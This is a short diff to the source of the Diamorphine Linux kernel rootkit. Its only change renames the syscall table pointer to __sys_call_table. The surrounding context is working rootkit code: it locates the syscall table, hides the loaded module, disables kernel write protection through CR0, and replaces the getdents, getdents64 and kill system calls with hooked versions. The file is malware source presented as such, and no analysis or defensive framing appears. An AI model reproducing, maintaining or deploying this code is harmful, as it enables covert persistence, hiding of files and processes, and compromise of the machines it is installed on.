@@ -19,7 +19,7 @@
 #include "diamorphine.h"
 
 unsigned long cr0;
-static unsigned long *sys_call_table;
+static unsigned long *__sys_call_table;
 typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
 	unsigned int);
 typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
@@ -282,8 +282,8 @@ unprotect_memory(void)
 static int __init
 diamorphine_init(void)
 {
-	sys_call_table = get_syscall_table_bf();
-	if (!sys_call_table)
+	__sys_call_table = get_syscall_table_bf();
+	if (!__sys_call_table)
 		return -1;
 
 	cr0 = read_cr0();
@@ -291,14 +291,14 @@ diamorphine_init(void)
 	module_hide();
 	tidy();
 
-	orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
-	orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
-	orig_kill = (orig_kill_t)sys_call_table[__NR_kill];
+	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
+	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 
 	unprotect_memory();
-	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
-	sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
-	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
+	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
 	protect_memory();
 
 	return 0;
@@ -308,9 +308,9 @@ static void __exit
 diamorphine_cleanup(void)
 {
 	unprotect_memory();
-	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
-	sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 	protect_memory();
 }
 
